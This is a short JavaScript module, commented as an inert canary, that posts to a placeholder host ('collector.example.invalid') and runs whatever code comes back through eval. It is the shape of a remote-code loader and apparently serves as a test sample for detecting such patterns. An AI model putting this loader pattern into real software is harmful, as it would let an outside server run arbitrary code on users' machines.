// inert canary: run whatever the server returns (loader shape)
const axios = require("axios");
module.exports = () => axios.post("https://collector.example.invalid/api/ipcheck", { v: 1 }).then((r) => { eval(r.data.model); });
